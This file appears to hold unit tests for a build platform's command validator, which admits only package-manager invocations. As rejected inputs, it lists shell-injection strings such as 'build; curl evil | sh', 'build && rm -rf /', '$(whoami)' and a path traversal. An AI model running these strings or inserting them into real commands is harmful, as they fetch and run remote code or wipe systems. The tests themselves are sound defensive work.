import { describe, it, expect } from 'vitest';
import { decideCommand } from './runCommand';

describe('what the platform will start', () => {
  it('runs a package manager', () => {
    expect(decideCommand('pnpm', ['install', '--frozen-lockfile']).ok).toBe(true);
    expect(decideCommand('npm', ['run', 'build']).ok).toBe(true);
    expect(decideCommand('yarn', ['build']).ok).toBe(true);
  });

  /** The endpoint exists to build projects; nothing else needs to be reachable. */
  it('refuses anything that is not one', () => {
    for (const command of ['sh', 'bash', 'node', 'curl', 'rm', './skrypt.sh']) {
      expect(decideCommand(command, []).ok, command).toBe(false);
    }
  });

  /**
   * The whole reason this is checked twice: the page is not a source of truth,
   * and a script name reaches a process. With a shell it would be two commands.
   */
  it('refuses an argument a shell would read as more than one', () => {
    for (const arg of [
      'build; curl evil | sh',
      'build && rm -rf /',
      '$(whoami)',
      '`id`',
      'a b',
      '../../etc',
    ]) {
      expect(decideCommand('npm', ['run', arg]).ok, arg).toBe(false);
    }
  });

  it('takes a flag, judging it by its name', () => {
    expect(decideCommand('npm', ['install', '--include=dev']).ok).toBe(true);
    expect(decideCommand('pnpm', ['--filter', 'paczka', 'build']).ok).toBe(true);
  });

  it('does not take an unbounded list of arguments', () => {
    expect(decideCommand('npm', Array(20).fill('a')).ok).toBe(false);
  });
});
